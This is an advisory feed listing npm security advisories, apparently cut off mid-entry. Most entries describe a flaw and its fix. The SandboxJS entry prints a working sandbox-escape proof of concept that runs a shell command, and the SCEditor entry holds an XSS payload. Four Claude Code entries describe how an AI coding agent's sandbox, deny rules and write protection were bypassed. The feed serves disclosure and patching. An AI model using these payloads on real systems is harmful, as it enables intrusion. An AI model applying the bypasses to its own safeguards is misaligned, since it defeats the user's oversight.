<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-02-07T16:02:32.134Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[opencc] Open Chinese Convert has Out-of-bounds Write]]></title>
        <id>https://github.com/advisories/GHSA-5pr6-crvp-2j9f</id>
        <link href="https://github.com/advisories/GHSA-5pr6-crvp-2j9f"/>
        <updated>2026-02-06T22:32:16.000Z</updated>
        <content type="html"><![CDATA[<p>A weakness has been identified in BYVoid OpenCC up to 1.1.9. This vulnerability affects the function opencc::MaxMatchSegmentation of the file src/MaxMatchSegmentation.cpp. This manipulation causes heap-based buffer overflow. The attack is restricted to local execution. The exploit has been made available to the public and could be used for attacks. Patch name: 345c9a50ab07018f1b4439776bad78a0d40778ec. To fix this issue, it is recommended to deploy a patch.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-15536">https://nvd.nist.gov/vuln/detail/CVE-2025-15536</a></li>
<li><a href="https://github.com/BYVoid/OpenCC/issues/997">https://github.com/BYVoid/OpenCC/issues/997</a></li>
<li><a href="https://github.com/BYVoid/OpenCC/pull/1005">https://github.com/BYVoid/OpenCC/pull/1005</a></li>
<li><a href="https://github.com/BYVoid/OpenCC/commit/345c9a50ab07018f1b4439776bad78a0d40778ec">https://github.com/BYVoid/OpenCC/commit/345c9a50ab07018f1b4439776bad78a0d40778ec</a></li>
<li><a href="https://github.com/oneafter/1222/blob/main/repro">https://github.com/oneafter/1222/blob/main/repro</a></li>
<li><a href="https://vuldb.com/?ctiid.341708">https://vuldb.com/?ctiid.341708</a></li>
<li><a href="https://vuldb.com/?id.341708">https://vuldb.com/?id.341708</a></li>
<li><a href="https://vuldb.com/?submit.733347">https://vuldb.com/?submit.733347</a></li>
<li><a href="https://github.com/advisories/GHSA-5pr6-crvp-2j9f">https://github.com/advisories/GHSA-5pr6-crvp-2j9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5pr6-crvp-2j9f</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-01-18T09:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@adonisjs/bodyparser] AdonisJS vulnerable to Denial of Service (DoS) via Unrestricted Memory Buffering in PartHandler during File Type Detection]]></title>
        <id>https://github.com/advisories/GHSA-xx9g-fh25-4q64</id>
        <link href="https://github.com/advisories/GHSA-xx9g-fh25-4q64"/>
        <updated>2026-02-07T00:33:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Denial of Service (DoS) vulnerability (CWE-400) exists in the multipart file handling logic of <code>@adonisjs/bodyparser</code>. When processing file uploads, the multipart parser may accumulate an unbounded amount of data in memory while attempting to detect file types, potentially leading to excessive memory consumption and process termination.</p>
<p>This issue affects applications that accept <code>multipart/form-data</code> uploads using affected versions of <code>@adonisjs/bodyparser</code>.</p>
<h3 id="details">Details</h3>
<p>AdonisJS parses <code>multipart/form-data</code> requests using the BodyParser package. During file uploads, the multipart parser attempts to detect the uploaded file type by accumulating incoming chunks in an internal buffer to perform magic number detection.</p>
<p>The internal buffer used for this detection does not enforce a maximum size and is not protected by a timeout or early termination condition. If the uploaded data does not match any supported file signatures, the buffer continues to grow as more chunks are received.</p>
<p>When certain configurations are used, such as deferred validations or permissive file size limits, this buffering behavior may persist for the duration of the upload stream.</p>
<h3 id="impact">Impact</h3>
<p>Exploitation requires a reachable endpoint that accepts multipart file uploads.</p>
<p>An attacker can send a specially crafted multipart request containing a large or unbounded stream of data that does not match known file signatures. This may cause the server to continuously allocate memory until the Node.js process exhausts available RAM and terminates due to an out-of-memory condition.</p>
<p>This results in a Denial of Service, making the application unavailable to legitimate users. Authentication is not required if the upload endpoint is publicly accessible.</p>
<h3 id="patches">Patches</h3>
<p>Fixes targeting v6 and v7 have been published below.</p>
<p>Users should upgrade to a version that includes the following fix:</p>
<ul>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3">https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9">https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/adonisjs/core/security/advisories/GHSA-xx9g-fh25-4q64">https://github.com/adonisjs/core/security/advisories/GHSA-xx9g-fh25-4q64</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25762">https://nvd.nist.gov/vuln/detail/CVE-2026-25762</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3">https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9">https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9</a></li>
<li><a href="https://github.com/advisories/GHSA-xx9g-fh25-4q64">https://github.com/advisories/GHSA-xx9g-fh25-4q64</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xx9g-fh25-4q64</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-06T19:53:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@adonisjs/bodyparser] AdonisJS vulnerable to Denial of Service (DoS) via Unrestricted Memory Buffering in PartHandler during File Type Detection]]></title>
        <id>https://github.com/advisories/GHSA-xx9g-fh25-4q64</id>
        <link href="https://github.com/advisories/GHSA-xx9g-fh25-4q64"/>
        <updated>2026-02-07T00:33:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Denial of Service (DoS) vulnerability (CWE-400) exists in the multipart file handling logic of <code>@adonisjs/bodyparser</code>. When processing file uploads, the multipart parser may accumulate an unbounded amount of data in memory while attempting to detect file types, potentially leading to excessive memory consumption and process termination.</p>
<p>This issue affects applications that accept <code>multipart/form-data</code> uploads using affected versions of <code>@adonisjs/bodyparser</code>.</p>
<h3 id="details">Details</h3>
<p>AdonisJS parses <code>multipart/form-data</code> requests using the BodyParser package. During file uploads, the multipart parser attempts to detect the uploaded file type by accumulating incoming chunks in an internal buffer to perform magic number detection.</p>
<p>The internal buffer used for this detection does not enforce a maximum size and is not protected by a timeout or early termination condition. If the uploaded data does not match any supported file signatures, the buffer continues to grow as more chunks are received.</p>
<p>When certain configurations are used, such as deferred validations or permissive file size limits, this buffering behavior may persist for the duration of the upload stream.</p>
<h3 id="impact">Impact</h3>
<p>Exploitation requires a reachable endpoint that accepts multipart file uploads.</p>
<p>An attacker can send a specially crafted multipart request containing a large or unbounded stream of data that does not match known file signatures. This may cause the server to continuously allocate memory until the Node.js process exhausts available RAM and terminates due to an out-of-memory condition.</p>
<p>This results in a Denial of Service, making the application unavailable to legitimate users. Authentication is not required if the upload endpoint is publicly accessible.</p>
<h3 id="patches">Patches</h3>
<p>Fixes targeting v6 and v7 have been published below.</p>
<p>Users should upgrade to a version that includes the following fix:</p>
<ul>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3">https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9">https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/adonisjs/core/security/advisories/GHSA-xx9g-fh25-4q64">https://github.com/adonisjs/core/security/advisories/GHSA-xx9g-fh25-4q64</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25762">https://nvd.nist.gov/vuln/detail/CVE-2026-25762</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3">https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9">https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9</a></li>
<li><a href="https://github.com/advisories/GHSA-xx9g-fh25-4q64">https://github.com/advisories/GHSA-xx9g-fh25-4q64</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xx9g-fh25-4q64</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-06T19:53:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@adonisjs/bodyparser] AdonisJS multipart body parsing has Prototype Pollution issue]]></title>
        <id>https://github.com/advisories/GHSA-f5x2-vj4h-vg4c</id>
        <link href="https://github.com/advisories/GHSA-f5x2-vj4h-vg4c"/>
        <updated>2026-02-07T00:33:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>A Prototype Pollution vulnerability (CWE-1321) in AdonisJS multipart form-data parsing may allow a remote attacker to manipulate object prototypes at runtime. This impacts <code>@adonisjs/bodyparser</code> through version <code>10.1.2</code> and <code>11.x</code> prerelease versions prior to <code>11.0.0-next.8</code>. This issue has been patched in <code>@adonisjs/bodyparser</code> versions <code>10.1.3</code> and <code>11.0.0-next.9</code></p>
<h3 id="details">Details</h3>
<p>AdonisJS parses <code>multipart/form-data</code> requests via the BodyParser package. During multipart parsing, form field names are used to construct plain JavaScript objects representing the parsed request body.</p>
<p>Due to insufficient validation of multipart field names, specially crafted fields containing reserved property names such as <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code> could be assigned directly to objects created during parsing. This allows an attacker to pollute object prototypes, potentially affecting other parts of the application that rely on these objects.</p>
<p><strong>The vulnerability is limited to multipart request parsing and does not affect JSON or URL-encoded body parsing.</strong></p>
<h3 id="impact">Impact</h3>
<p>Exploitation requires an application endpoint that accepts and parses <code>multipart/form-data</code> requests.</p>
<p>If exploited, prototype pollution may lead to unexpected application behavior, logic bypasses, or security issues depending on how polluted objects are later consumed. The severity of the impact depends on application logic and usage patterns of the parsed request data.</p>
<h3 id="patches">Patches</h3>
<p>Fixes targeting v6 and v7 have been published below.</p>
<p>Users should upgrade to a version that includes the following fix:</p>
<ul>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3">https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9">https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/adonisjs/core/security/advisories/GHSA-f5x2-vj4h-vg4c">https://github.com/adonisjs/core/security/advisories/GHSA-f5x2-vj4h-vg4c</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/commit/40e1c71f958cffb74f6b91bed6630dca979062ed">https://github.com/adonisjs/bodyparser/commit/40e1c71f958cffb74f6b91bed6630dca979062ed</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9">https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25754">https://nvd.nist.gov/vuln/detail/CVE-2026-25754</a></li>
<li><a href="https://github.com/advisories/GHSA-f5x2-vj4h-vg4c">https://github.com/advisories/GHSA-f5x2-vj4h-vg4c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f5x2-vj4h-vg4c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-06T19:27:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@adonisjs/bodyparser] AdonisJS multipart body parsing has Prototype Pollution issue]]></title>
        <id>https://github.com/advisories/GHSA-f5x2-vj4h-vg4c</id>
        <link href="https://github.com/advisories/GHSA-f5x2-vj4h-vg4c"/>
        <updated>2026-02-07T00:33:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>A Prototype Pollution vulnerability (CWE-1321) in AdonisJS multipart form-data parsing may allow a remote attacker to manipulate object prototypes at runtime. This impacts <code>@adonisjs/bodyparser</code> through version <code>10.1.2</code> and <code>11.x</code> prerelease versions prior to <code>11.0.0-next.8</code>. This issue has been patched in <code>@adonisjs/bodyparser</code> versions <code>10.1.3</code> and <code>11.0.0-next.9</code></p>
<h3 id="details">Details</h3>
<p>AdonisJS parses <code>multipart/form-data</code> requests via the BodyParser package. During multipart parsing, form field names are used to construct plain JavaScript objects representing the parsed request body.</p>
<p>Due to insufficient validation of multipart field names, specially crafted fields containing reserved property names such as <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code> could be assigned directly to objects created during parsing. This allows an attacker to pollute object prototypes, potentially affecting other parts of the application that rely on these objects.</p>
<p><strong>The vulnerability is limited to multipart request parsing and does not affect JSON or URL-encoded body parsing.</strong></p>
<h3 id="impact">Impact</h3>
<p>Exploitation requires an application endpoint that accepts and parses <code>multipart/form-data</code> requests.</p>
<p>If exploited, prototype pollution may lead to unexpected application behavior, logic bypasses, or security issues depending on how polluted objects are later consumed. The severity of the impact depends on application logic and usage patterns of the parsed request data.</p>
<h3 id="patches">Patches</h3>
<p>Fixes targeting v6 and v7 have been published below.</p>
<p>Users should upgrade to a version that includes the following fix:</p>
<ul>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3">https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9">https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/adonisjs/core/security/advisories/GHSA-f5x2-vj4h-vg4c">https://github.com/adonisjs/core/security/advisories/GHSA-f5x2-vj4h-vg4c</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/commit/40e1c71f958cffb74f6b91bed6630dca979062ed">https://github.com/adonisjs/bodyparser/commit/40e1c71f958cffb74f6b91bed6630dca979062ed</a></li>
<li><a href="https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9">https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25754">https://nvd.nist.gov/vuln/detail/CVE-2026-25754</a></li>
<li><a href="https://github.com/advisories/GHSA-f5x2-vj4h-vg4c">https://github.com/advisories/GHSA-f5x2-vj4h-vg4c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f5x2-vj4h-vg4c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-06T19:27:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@anthropic-ai/claude-code] Claude Code has Sandbox Escape via Persistent Configuration Injection in settings.json]]></title>
        <id>https://github.com/advisories/GHSA-ff64-7w26-62rf</id>
        <link href="https://github.com/advisories/GHSA-ff64-7w26-62rf"/>
        <updated>2026-02-06T19:14:34.000Z</updated>
        <content type="html"><![CDATA[<p>Claude Code's bubblewrap sandboxing mechanism failed to properly protect the .claude/settings.json configuration file when it did not exist at startup. While the parent directory was mounted as writable and .claude/settings.local.json was explicitly protected with read-only constraints, settings.json was not protected if it was missing. This allowed malicious code running inside the sandbox to create this file and inject persistent hooks (such as SessionStart commands) that would execute with host privileges when Claude Code was restarted. </p>
<p>Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.</p>
<p>Claude Code thanks hackerone.com/edbr for reporting this issue!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/anthropics/claude-code/security/advisories/GHSA-ff64-7w26-62rf">https://github.com/anthropics/claude-code/security/advisories/GHSA-ff64-7w26-62rf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25725">https://nvd.nist.gov/vuln/detail/CVE-2026-25725</a></li>
<li><a href="https://github.com/advisories/GHSA-ff64-7w26-62rf">https://github.com/advisories/GHSA-ff64-7w26-62rf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ff64-7w26-62rf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-06T19:14:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@anthropic-ai/claude-code] Claude Code has Permission Deny Bypass Through Symbolic Links]]></title>
        <id>https://github.com/advisories/GHSA-4q92-rfm6-2cqx</id>
        <link href="https://github.com/advisories/GHSA-4q92-rfm6-2cqx"/>
        <updated>2026-02-06T19:08:05.000Z</updated>
        <content type="html"><![CDATA[<p>Claude Code failed to strictly enforce deny rules configured in settings.json when accessing files through symbolic links. If a user explicitly denied Claude Code access to a file (such as /etc/passwd) and Claude Code had access to a symbolic link pointing to that file, it was possible for Claude Code to read the restricted file through the symlink without triggering deny rule enforcement. </p>
<p>Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.</p>
<p>Claude Code thanks <a href="https://hackerone.com/ofirh">https://hackerone.com/ofirh</a> for reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/anthropics/claude-code/security/advisories/GHSA-4q92-rfm6-2cqx">https://github.com/anthropics/claude-code/security/advisories/GHSA-4q92-rfm6-2cqx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25724">https://nvd.nist.gov/vuln/detail/CVE-2026-25724</a></li>
<li><a href="https://github.com/advisories/GHSA-4q92-rfm6-2cqx">https://github.com/advisories/GHSA-4q92-rfm6-2cqx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4q92-rfm6-2cqx</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-02-06T19:08:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@anthropic-ai/claude-code] Claude Code Vulnerable to Command Injection via Piped sed Command Bypasses File Write Restrictions]]></title>
        <id>https://github.com/advisories/GHSA-mhg7-666j-cqg4</id>
        <link href="https://github.com/advisories/GHSA-mhg7-666j-cqg4"/>
        <updated>2026-02-06T19:04:51.000Z</updated>
        <content type="html"><![CDATA[<p>Claude Code failed to properly validate commands using piped sed operations with the echo command, allowing attackers to bypass file write restrictions. This vulnerability enabled writing to sensitive directories like the .claude folder and paths outside the project scope. Exploiting this required the ability to execute commands through Claude Code with the "accept edits" feature enabled. </p>
<p>Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.</p>
<p>Claude Code thanks hackerone.com/nil221 for reporting this issue!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/anthropics/claude-code/security/advisories/GHSA-mhg7-666j-cqg4">https://github.com/anthropics/claude-code/security/advisories/GHSA-mhg7-666j-cqg4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25723">https://nvd.nist.gov/vuln/detail/CVE-2026-25723</a></li>
<li><a href="https://github.com/advisories/GHSA-mhg7-666j-cqg4">https://github.com/advisories/GHSA-mhg7-666j-cqg4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mhg7-666j-cqg4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-06T19:04:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@anthropic-ai/claude-code] Claude Code Vulnerable to Command Injection via Directory Change Bypasses Write Protection]]></title>
        <id>https://github.com/advisories/GHSA-66q4-vfjg-2qhh</id>
        <link href="https://github.com/advisories/GHSA-66q4-vfjg-2qhh"/>
        <updated>2026-02-06T19:02:42.000Z</updated>
        <content type="html"><![CDATA[<p>Claude Code failed to properly validate directory changes when combined with write operations to protected folders. By using the <code>cd</code> command to navigate into sensitive directories like <code>.claude</code>, it was possible to bypass write protection and create or modify files without user confirmation. Reliably exploiting this required the ability to add untrusted content into a Claude Code context window. </p>
<p>Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.</p>
<p>About
Claude Code thanks hackerone.com/nil221 for reporting this issue!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/anthropics/claude-code/security/advisories/GHSA-66q4-vfjg-2qhh">https://github.com/anthropics/claude-code/security/advisories/GHSA-66q4-vfjg-2qhh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25722">https://nvd.nist.gov/vuln/detail/CVE-2026-25722</a></li>
<li><a href="https://github.com/advisories/GHSA-66q4-vfjg-2qhh">https://github.com/advisories/GHSA-66q4-vfjg-2qhh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-66q4-vfjg-2qhh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-06T19:02:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[client-certificate-auth] client-certificate-auth Vulnerable to Open Redirect via Host Header Injection in HTTP-to-HTTPS redirect]]></title>
        <id>https://github.com/advisories/GHSA-m4w9-gch5-c2g4</id>
        <link href="https://github.com/advisories/GHSA-m4w9-gch5-c2g4"/>
        <updated>2026-02-06T21:43:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Versions 0.2.1 and 0.3.0 of <code>client-certificate-auth</code> contain an open redirect vulnerability. The middleware unconditionally redirects HTTP requests to HTTPS using the unvalidated <code>Host</code> header, allowing an attacker to redirect users to arbitrary domains.</p>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<pre><code class="language-javascript">// lib/clientCertificateAuth.js (versions 0.2.1, 0.3.0)
if (!req.secure &amp;&amp; req.header('x-forwarded-proto') != 'https') {
  return res.redirect('https://' + req.header('host') + req.url);
}
</code></pre>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker crafts a link: <code>http://vulnerable-app.example.com/login</code></li>
<li>When victim clicks, attacker intercepts and injects header: <code>Host: attacker.com</code></li>
<li>Server responds: <code>302 Found → https://attacker.com/login</code></li>
<li>Victim is redirected to attacker-controlled site</li>
</ol>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Phishing</strong>: Attackers can use trusted domain links to redirect victims to credential-harvesting pages</li>
<li><strong>OAuth/SSO Token Theft</strong>: In authentication flows, authorization codes or tokens may leak via redirect</li>
<li><strong>Referer Leakage</strong>: Sensitive URL parameters may be exposed to attacker domains via the Referer header</li>
<li><strong>Cache Poisoning</strong>: In deployments with shared caches, malicious redirects may be cached and served to other users</li>
</ul>
<h3 id="exploitability">Exploitability</h3>
<p>Exploitation requires that HTTP traffic reaches the Node.js application without TLS termination setting <code>x-forwarded-proto: https</code>. This condition is uncommon in production deployments behind modern reverse proxies or load balancers, which limits real-world exploitability.</p>
<h3 id="fix">Fix</h3>
<p>The vulnerable redirect behavior has been completely removed in version 1.0.0.</p>
<pre><code class="language-bash">npm install client-certificate-auth@^1.0.0
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible:</p>
<ol>
<li>Block HTTP traffic at the network/load balancer level</li>
<li>Ensure your reverse proxy always sets <code>x-forwarded-proto: https</code></li>
<li>Add middleware before <code>clientCertificateAuth</code> to validate the <code>Host</code> header against an allowlist</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html">OWASP: Unvalidated Redirects and Forwards</a></li>
<li><a href="https://github.com/tgies/client-certificate-auth/commit/8fc995e953db483495be46862965e50fe9e1cc52">Fix Commit</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tgies/client-certificate-auth/security/advisories/GHSA-m4w9-gch5-c2g4">https://github.com/tgies/client-certificate-auth/security/advisories/GHSA-m4w9-gch5-c2g4</a></li>
<li><a href="https://github.com/tgies/client-certificate-auth/commit/8fc995e953db483495be46862965e50fe9e1cc52">https://github.com/tgies/client-certificate-auth/commit/8fc995e953db483495be46862965e50fe9e1cc52</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25651">https://nvd.nist.gov/vuln/detail/CVE-2026-25651</a></li>
<li><a href="https://github.com/tgies/client-certificate-auth/releases/tag/v1.0.0">https://github.com/tgies/client-certificate-auth/releases/tag/v1.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m4w9-gch5-c2g4">https://github.com/advisories/GHSA-m4w9-gch5-c2g4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4w9-gch5-c2g4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-06T18:54:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sceditor] SCEditor has DOM XSS via emoticon URL/HTML injection]]></title>
        <id>https://github.com/advisories/GHSA-25fq-6qgg-qpj8</id>
        <link href="https://github.com/advisories/GHSA-25fq-6qgg-qpj8"/>
        <updated>2026-02-06T21:43:39.000Z</updated>
        <content type="html"><![CDATA[<p>If an attacker has the ability control configuration options passed to <code>sceditor.create()</code>, like <code>emoticons</code>, <code>charset</code>, etc. then it's possible for them to trigger an XSS attack due to lack of sanitisation of configuration options.</p>
<p>Proof of concept:</p>
<pre><code class="language-js">sceditor.create(textarea, {
  emoticons: {
    dropdown: { ':)': { url: 'x" onerror="window.__xss = true' } }
  }
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/samclarke/SCEditor/security/advisories/GHSA-25fq-6qgg-qpj8">https://github.com/samclarke/SCEditor/security/advisories/GHSA-25fq-6qgg-qpj8</a></li>
<li><a href="https://github.com/samclarke/SCEditor/commit/5733aed4f0e257cb78e1ba191715fc458cbd473d">https://github.com/samclarke/SCEditor/commit/5733aed4f0e257cb78e1ba191715fc458cbd473d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25581">https://nvd.nist.gov/vuln/detail/CVE-2026-25581</a></li>
<li><a href="https://github.com/advisories/GHSA-25fq-6qgg-qpj8">https://github.com/advisories/GHSA-25fq-6qgg-qpj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-25fq-6qgg-qpj8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-06T18:34:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nyariv/sandboxjs] @nyariv/sandboxjs vulnerable to sandbox escape via TOCTOU bug on keys in property accesses]]></title>
        <id>https://github.com/advisories/GHSA-7x3h-rm86-3342</id>
        <link href="https://github.com/advisories/GHSA-7x3h-rm86-3342"/>
        <updated>2026-02-06T21:42:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A sandbox escape vulnerabilities due to a mismatch between the key on which the validation is performed and the key used for accessing properties.</p>
<h3 id="details">Details</h3>
<p>Even though the key used in property accesses (<code>b</code> in the code below) is annotated as <code>string</code>, this is never enforced:
<a href="https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304">https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304</a>
So, attackers can pass malicious objects that coerce to different string values when used, e.g., one for the time the key is sanitized using <code>hasOwnProperty(key)</code> and a different one for when the key is used for the actual property access.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">const Sandbox = require('@nyariv/sandboxjs').default;

const code = `
let a = new Map;
a.x = 23;
let count = 0;

let nastyProp = {toString: () =&gt; {if (count&lt;1){count++;return "x"} else return "__proto__"}}
let mapProt = a[nastyProp];
mapProt.has = isFinite;
console.log(
  isFinite.constructor(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);`;
const scope = {};
const sandbox = new Sandbox();
const exec = sandbox.compile(code);
exec(scope).run(); 
</code></pre>
<h3 id="impact">Impact</h3>
<p>Remote code execution, if attacker can execute code inside the sandbox.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nyariv/SandboxJS/security/advisories/GHSA-7x3h-rm86-3342">https://github.com/nyariv/SandboxJS/security/advisories/GHSA-7x3h-rm86-3342</a></li>
<li><a href="https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3">https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3</a></li>
